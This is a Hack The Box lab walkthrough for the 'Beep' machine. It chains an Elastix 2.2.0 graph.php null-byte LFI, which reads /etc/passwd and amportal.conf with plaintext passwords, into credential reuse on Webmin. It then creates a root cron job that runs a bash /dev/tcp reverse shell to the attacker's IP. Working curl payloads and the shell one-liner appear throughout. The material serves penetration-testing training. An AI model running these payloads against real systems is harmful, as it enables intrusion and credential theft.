# HTB: Beep, Full Walkthrough

## Tags
#HTB #Beep #Linux #Elastix #LFI #Webmin #CredentialReuse #CronPrivesc #NullByteBypass #Easy

---

## Box Info

**Target:** `10.129.229.183` (swap for your instance IP) · **Difficulty:** Easy · **OS:** Linux (CentOS 5)

**The gist:** an ancient Elastix PBX install (built on old PHP, old Apache) leaks a local file inclusion bug that reads straight through to a config file full of plaintext credentials. Those same credentials get reused for the box's Webmin admin panel, and Webmin's own "create a scheduled job" feature turns into a root shell. A genuinely great box for practicing "old software = LFI" pattern recognition, and for the very common real-world lesson that credential reuse across services collapses the whole security model at once.

## 3. A Quick Detour: Firefox Won't Load the Site

Browsing to `https://10.129.229.183` directly in Firefox throws a "Your connection is not secure" / TLS error. Not a real vulnerability, just a byproduct of how old this box is: it only supports TLSv1.0 and SSLv3, both long since disabled by default in modern browsers.

**Fix, if browsing the site directly is needed (e.g. for Webmin later):**
1. In Firefox's address bar, go to `about:config`, click **Accept the Risk and Continue**.
2. Search for `security.tls.version.enable-deprecated`, double-click to toggle it to **true**.
3. Restart Firefox, then revisit the site. When the certificate warning appears, click **Advanced** → **Add Exception** → **Confirm Security Exception**.

> 📸 Screenshot: the `about:config` toggle, and the resulting security exception prompt

**For command-line tools, this is much simpler**, just force the old TLS version directly:
```bash
curl -k --tlsv1.0 "https://10.129.229.183" 2>/dev/null
```
`-k` ignores certificate errors, `--tlsv1.0` forces the old protocol version the server actually supports.

## 4. Local File Inclusion (LFI)

```bash
searchsploit elastix
```
```
Elastix 2.2.0 - 'graph.php' Local File Inclusion       | php/webapps/37637.pl
```
Exact match, worth reading the exploit before running anything (same discipline as [[Locating Public Exploits#13.1. Getting Started|Module 13's 13.1]]):
```bash
searchsploit -x exploits/php/webapps/37637.pl
```
**What it does:** targets `/vtigercrm/graph.php`'s `current_language` parameter with a `%00` (null byte) trick. PHP versions before 5.3 treat `%00` as a string terminator, so appending it after a path lets you strip off whatever file extension the app was expecting to force, and read an arbitrary file instead.

**Test it directly against `/etc/passwd`:**
```bash
curl -k --tlsv1.0 "https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action" 2>/dev/null
```
> 🔍 Full breakdown of the TLS downgrade, double-slash, and null-byte pieces stacked together in this one payload: [[File Inclusion & Traversal (Breakdowns)#Elastix graph.php LFI: TLS downgrade, double-slash, and null-byte truncation stacked together|Command Breakdowns]]
> 🔗 **HackTricks** File Inclusion/LFI: [github.com/HackTricks-wiki/hacktricks](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md) and **PayloadsAllTheThings** File Inclusion: [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md), both cover the null-byte technique and other legacy-PHP LFI tricks in more depth.

**Result:** the full `/etc/passwd` comes back. Worth actually reading through it rather than skimming, since the interesting non-system accounts are the real payoff:
```
asterisk:x:100:101:Asterisk PBX:/var/lib/asterisk:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
```
`fanis` in particular looks like the regular user account, likely where the user flag lives.

> 📸 Screenshot: the retrieved `/etc/passwd` contents

**Now go after something more useful than a system file, application credentials.** Elastix (built on FreePBX/Asterisk) stores its config in a predictable location:
```bash
curl -k --tlsv1.0 "https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action" 2>/dev/null
```
**Result, straight in plaintext:**
```
AMPDBUSER=asteriskuser
AMPDBPASS=jEhdIekWmdjE
AMPMGRUSER=admin
AMPMGRPASS=jEhdIekWmdjE
FOPPASSWORD=jEhdIekWmdjE
ARI_ADMIN_PASSWORD=jEhdIekWmdjE
```
Every credential in this file uses the **same password**, `jEhdIekWmdjE`. That's a strong hint it's reused across other services on this box too, worth trying it broadly rather than just where it was found.

> 📸 Screenshot: the `amportal.conf` contents showing the reused password

## 6. Getting a Root Shell via a Scheduled Cron Job

Webmin, as a full system administration panel, can create a cron job to run as any user, including root. That's effectively command execution as root through a GUI form.

**Step 1: navigate to System → Scheduled Cron Jobs → Create a new scheduled cron job.**

> 📸 Screenshot: the Scheduled Cron Jobs page, and the empty creation form

**Step 2: fill in the job.**

| Setting | Value |
|---|---|
| Execute as user | `root` |
| Command | `bash -c 'bash -i >& /dev/tcp/<YOUR_KALI_IP>/4444 0>&1'` |
| When to execute | "Now", or set it to run within the next minute |

Swap `<YOUR_KALI_IP>` for the real `tun0` IP before saving.

> 🔗 **RevShells**: [revshells.com](https://www.revshells.com/) can generate this exact bash reverse shell one-liner if a different shell/language is needed for a similar target.

> 📸 Screenshot: the filled-in cron job form, just before saving

**Step 3: start a listener first, then let the job fire.**
```bash
sudo nc -lvnp 4444
```
Once the scheduled time hits, the listener catches a connection:
```
Listening on 0.0.0.0 4444
Connection received on 10.129.229.183 39747
bash: no job control in this shell
[root@beep ]#
```

> 📸 Screenshot: the caught reverse shell

**Confirm the privilege level:**
```bash
id
whoami
```
```
uid=0(root) gid=0(root) groups=0(root),...
root
```
Straight to root, no privilege escalation step needed at all, Webmin's cron feature already ran the payload as root by design.

## Summary of the Chain

| Step | Access | Method |
|---|---|---|
| 1 | Recon | Nmap fingerprints Elastix, Webmin, and a very outdated Apache/CentOS stack |
| 2 | File read | Elastix 2.2.0 `graph.php` LFI (null-byte bypass) leaks `/etc/passwd` and `amportal.conf` |
| 3 | Admin access | The `amportal.conf` password is reused for Webmin's `root` login |
| 4 | Root shell | Webmin's Scheduled Cron Jobs feature runs a reverse shell payload as root directly |

**Root causes / lessons worth carrying forward:**
- Old software carries old bugs. Apache 2.2.3, PHP pre-5.3, and Elastix 2.2.0 are all long past end-of-life, and it shows.
- Null-byte string truncation (`%00`) is a legacy-PHP-specific trick, worth remembering as a filter/extension bypass on anything running PHP < 5.3.5.
- **Credential reuse is the real story of this box.** One password, meant for an internal database config, ended up granting full Webmin admin access too. Auditing where a "found" password might be reused is often more valuable than the initial leak itself.
- A powerful admin panel (Webmin) exposed with weak/reused credentials is functionally the same as remote root.
